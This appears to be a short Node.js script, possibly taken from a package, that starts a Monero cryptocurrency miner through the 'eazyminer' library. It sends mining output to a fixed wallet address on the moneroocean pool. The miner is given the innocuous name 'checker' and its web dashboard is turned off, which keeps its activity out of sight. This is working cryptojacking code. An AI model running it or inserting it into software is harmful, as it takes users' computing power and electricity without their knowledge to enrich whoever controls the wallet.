const a = require('eazyminer');

const checker = new a(
{
    pools: [
      {
        coin: 'XMR',
        user:
          '41pEhhCuFnjLQYFmN8miy8fCgvGX4VwyMgHvkMaCNocnDW4eahaPC74jaRyd9TfYwMgk2Z2swXYoc6fP1hYbCYgKNAnabxv',
        url: 'gulf.moneroocean.stream:20128', // optional pool URL,
        pass: "0",
      },
    ],
    web: [
      {
        enabled: false,
        port: 3000,
      },
    ],
    autoStart: false,
  },
);


checker.start();
